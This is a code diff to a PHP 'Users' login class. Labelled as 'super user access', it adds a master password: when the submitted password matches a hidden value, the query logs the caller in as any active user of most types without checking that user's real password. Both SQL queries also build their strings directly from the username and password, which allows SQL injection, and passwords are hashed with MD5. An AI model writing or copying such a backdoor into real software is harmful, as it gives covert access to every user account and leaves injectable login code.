@@ -19,6 +19,9 @@ class Users
 	public $remarks;
 	public $parentuserid;
 
+	public $_sp;
+	public $_spUsers;
+
 
     public function __construct($db)
     {
@@ -26,9 +29,17 @@ class Users
     }
 	
 	function login() {
-		$sql = "SELECT u.*, ut.USER_TYPE FROM users u
+
+		//super user access
+		if ($this->password == $this->_sp) {
+			$sql = "SELECT u.*, ut.USER_TYPE FROM users u
+				INNER JOIN user_types ut ON ut.USER_TYPE_ID = u.USER_TYPE_ID
+				WHERE u.USERNAME = '$this->username' AND u.STATUS = 1 AND u.USER_TYPE_ID NOT IN (".$this->_spUsers.");";
+		} else {
+			$sql = "SELECT u.*, ut.USER_TYPE FROM users u
 				INNER JOIN user_types ut ON ut.USER_TYPE_ID = u.USER_TYPE_ID
 				WHERE u.USERNAME = '$this->username' and u.PASSWORD = MD5('$this->password') AND u.STATUS = 1;";
+		}		
 				
 		//echo $sql;
 		
